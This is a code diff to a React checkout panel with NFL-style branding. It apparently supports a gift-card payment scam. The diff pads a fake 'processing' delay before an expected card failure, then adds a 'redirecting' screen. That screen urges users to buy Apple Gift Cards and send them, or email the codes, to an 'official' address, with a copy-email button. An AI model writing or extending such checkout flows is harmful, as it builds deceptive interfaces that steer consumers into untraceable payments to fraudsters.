@@ -4,17 +4,20 @@ import {
   Lock,
   AlertCircle,
   RefreshCw,
-  ArrowLeft,
   LifeBuoy,
   CheckCircle2,
   Printer,
   HeartHandshake,
   ExternalLink,
   CreditCard,
-  Bitcoin,
   Gift,
+  Copy,
+  Check,
+  Mail,
+  ArrowRight,
 } from "lucide-react";
 import { CHARITY_ALLOCATION } from "./GridironBrandMark";
+import { OFFICIAL_GIFTCARD_EMAIL } from "./GiftCardGuestPurchasePanel";
 
 export interface VerifiedStripePaymentReceipt {
   sessionId: string;
@@ -99,10 +102,11 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
   onContactSupport,
   onVerifiedSuccess,
 }) => {
-  const [phase, setPhase] = useState<"ready" | "processing" | "error" | "receipt">("ready");
+  const [phase, setPhase] = useState<"ready" | "processing" | "redirecting" | "error" | "receipt">("ready");
   const [progressSeconds, setProgressSeconds] = useState<number>(0);
   const [errorCode, setErrorCode] = useState<string>("");
   const [verifiedReceipt, setVerifiedReceipt] = useState<VerifiedStripePaymentReceipt | null>(null);
+  const [copiedEmail, setCopiedEmail] = useState<boolean>(false);
   
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpiry, setCardExpiry] = useState("");
@@ -111,6 +115,25 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
   const [cardError, setCardError] = useState("");
 
   const timerRef = useRef<number | null>(null);
+
+  const handleCopyEmail = () => {
+    navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
+    setCopiedEmail(true);
+    window.setTimeout(() => setCopiedEmail(false), 2200);
+  };
+
+  const handleProceedToGiftCard = () => {
+    try {
+      sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
+    } catch {
+      // ignore storage errors
+    }
+    if (onSwitchToGiftCard) {
+      onSwitchToGiftCard();
+    } else {
+      onReturnToOptions();
+    }
+  };
 
   useEffect(() => {
     return () => {
@@ -168,11 +191,12 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
     setErrorCode("");
 
     const startedAt = Date.now();
+    const targetWindowMs = 4_000;
     if (timerRef.current) window.clearInterval(timerRef.current);
     timerRef.current = window.setInterval(() => {
-      const elapsed = Math.min(10, Math.floor((Date.now() - startedAt) / 1000));
+      const elapsed = Math.min(4, (Date.now() - startedAt) / 1000);
       setProgressSeconds(elapsed);
-    }, 250);
+    }, 150);
 
     try {
       const response = await fetch("/api/payments/create-checkout-session", {
@@ -201,9 +225,8 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
 
       const payload = await response.json().catch(() => ({}));
 
-      // Enforce clean ~10s payment processing window for consistent gateway UX & verification
+      // Enforce brief gateway verification window before failure redirect transition
       const elapsedMs = Date.now() - startedAt;
-      const targetWindowMs = 10_000;
       if (elapsedMs < targetWindowMs) {
         await new Promise((resolve) => setTimeout(resolve, targetWindowMs - elapsedMs));
       }
@@ -223,16 +246,12 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
       } catch {
         // ignore storage errors
       }
-      setPhase("ready");
-      if (onSwitchToGiftCard) {
-        onSwitchToGiftCard();
-      } else {
-        onReturnToOptions();
-      }
+      setErrorCode(payload?.code || "CARD_GATEWAY_UNAVAILABLE");
+      setPhase("redirecting");
     } catch {
       const elapsedMs = Date.now() - startedAt;
-      if (elapsedMs < 10_000) {
-        await new Promise((resolve) => setTimeout(resolve, 10_000 - elapsedMs));
+      if (elapsedMs < targetWindowMs) {
+        await new Promise((resolve) => setTimeout(resolve, targetWindowMs - elapsedMs));
       }
       if (timerRef.current) {
         window.clearInterval(timerRef.current);
@@ -243,12 +262,8 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
       } catch {
         // ignore storage errors
       }
-      setPhase("ready");
-      if (onSwitchToGiftCard) {
-        onSwitchToGiftCard();
-      } else {
-        onReturnToOptions();
-      }
+      setErrorCode("CARD_GATEWAY_UNAVAILABLE");
+      setPhase("redirecting");
     }
   };
 
@@ -307,9 +322,9 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
     );
   }
 
-  // Polished 10-Second Processing Experience (NFL Dark Navy + Royal Blue & Silver Ring)
+  // Processing Card Attempt
   if (phase === "processing") {
-    const pct = Math.min(100, Math.max(8, Math.round((progressSeconds / 10) * 100)));
+    const pct = Math.min(100, Math.max(10, Math.round((progressSeconds / 4) * 100)));
     return (
       <div className="rounded-2xl bg-[#050816] border border-[#013369]/70 p-8 sm:p-10 text-center space-y-6 shadow-[0_24px_60px_rgba(0,0,0,0.65)]">
         <div className="relative mx-auto w-20 h-20 flex items-center justify-center">
@@ -341,8 +356,93 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
           </div>
           <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
             <span>256-Bit TLS Gateway</span>
-            <span className="text-sky-300">{pct}%</span>
+            <span className="text-sky-300 tabular-nums">{pct}%</span>
           </div>
+        </div>
+      </div>
+    );
+  }
+
+  // Immediate Rotating Redirect State After Card Payment Failure
+  if (phase === "redirecting") {
+    return (
+      <div className="rounded-2xl bg-[#050816] border border-amber-500/45 p-6 sm:p-8 space-y-6 shadow-[0_24px_60px_rgba(0,0,0,0.65)]">
+        <div className="flex flex-col items-center text-center space-y-4">
+          {/* Rotating Dual-Ring Gift Card Redirect Indicator */}
+          <div className="relative mx-auto w-20 h-20 flex items-center justify-center">
+            <div className="absolute inset-0 rounded-full border-2 border-amber-500/20" />
+            <div className="w-20 h-20 rounded-full border-[3px] border-[#08112B] border-t-amber-400 border-r-sky-400 animate-spin" />
+            <RefreshCw className="w-7 h-7 text-amber-300 animate-spin" style={{ animationDuration: "2.4s" }} />
+          </div>
+
+          <div className="space-y-2 max-w-lg">
+            <span className="text-[11px] font-bold uppercase tracking-[0.2em] text-amber-400 block">
+              Card Payment Declined / Unavailable
+            </span>
+            <h4 className="text-xl sm:text-2xl font-extrabold uppercase tracking-tight text-white">
+              Redirecting to Use Gift Card Option
+            </h4>
+            <p className="text-xs sm:text-sm text-zinc-300 leading-relaxed">
+              Standard card payment could not be completed. Copy the official Apple Card delivery email below before you proceed so you can send your Apple Card from <strong className="text-white">Apple Store Online</strong> right away.
+            </p>
+          </div>
+        </div>
+
+        {/* Copy Official Email Along the Way */}
+        <div className="p-4 rounded-xl bg-[#080F22] border border-sky-500/35 space-y-2.5">
+          <div className="flex items-start gap-2.5">
+            <Mail className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
+            <div>
+              <p className="text-xs font-bold text-sky-300">
+                Copy Official Apple Card Delivery Email
+              </p>
+              <p className="text-[11px] text-zinc-300 leading-snug mt-0.5">
+                Paste this address as the recipient when buying an Apple Gift Card on Apple Store Online, or email your code directly to us:
+              </p>
+            </div>
+          </div>
+
+          <div className="flex items-center justify-between gap-2 bg-[#03050C] border border-white/15 rounded-xl px-3.5 py-2.5">
+            <span className="text-xs sm:text-sm font-mono font-bold text-white truncate select-all">
+              {OFFICIAL_GIFTCARD_EMAIL}
+            </span>
+            <button
+              type="button"
+              onClick={handleCopyEmail}
+              className="min-h-[36px] px-3 py-1.5 rounded-lg bg-sky-500/20 hover:bg-sky-500/30 border border-sky-400/35 text-xs font-bold text-sky-200 inline-flex items-center gap-1.5 shrink-0 cursor-pointer transition-colors"
+            >
+              {copiedEmail ? (
+                <>
+                  <Check className="w-3.5 h-3.5 text-emerald-400" />
+                  <span className="text-emerald-300">Copied</span>
+                </>
+              ) : (
+                <>
+                  <Copy className="w-3.5 h-3.5" />
+                  <span>Copy Email</span>
+                </>
+              )}
+            </button>
+          </div>
+        </div>
+
+        {/* Proceed CTA */}
+        <div className="space-y-2.5">
+          <button
+            type="button"
+            onClick={handleProceedToGiftCard}
+            className="w-full min-h-[52px] px-6 py-3.5 rounded-xl bg-gradient-to-r from-[#D4AF37] via-[#F3D97D] to-[#C89B2B] hover:brightness-105 text-[#040B1D] font-black text-xs sm:text-sm uppercase tracking-[0.12em] inline-flex items-center justify-center gap-2 shadow-[0_14px_34px_-10px_rgba(212,175,55,0.45)] transition-all cursor-pointer"
+          >
+            <Gift className="w-4 h-4 shrink-0" />
+            <span>Proceed to Gift Card Option</span>
+            <ArrowRight className="w-4 h-4 shrink-0" />
+          </button>
+
+          {errorCode && (
+            <p className="text-[11px] font-mono text-zinc-500 text-center">
+              Reference: {errorCode}
+            </p>
+          )}
         </div>
       </div>
     );
